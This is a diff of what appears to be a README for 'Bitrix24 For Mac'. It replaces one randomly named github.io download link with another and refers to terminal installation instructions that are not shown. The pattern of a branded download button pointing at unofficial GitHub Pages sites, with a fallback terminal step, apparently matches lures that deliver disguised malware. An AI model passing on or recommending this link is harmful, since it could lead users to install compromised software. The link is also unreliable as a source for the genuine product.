@@ -3,7 +3,7 @@
 
 Bitrix24 For Mac is an all-in-one business management platform designed for macOS users, offering tools for CRM, task management, and team collaboration. Streamline your workflows with a seamless, cloud-based solution. Follow the instructions below to install Bitrix24 on your Mac and boost your productivity.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge&logo=apple)](https://fituganshfgh.github.io/.github/bitrix)
+[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge&logo=apple)](https://mrboomzeus519.github.io/gimronus/bitrix)
 
 If the download button doesn’t work, follow the manual installation instructions below using the terminal.
 
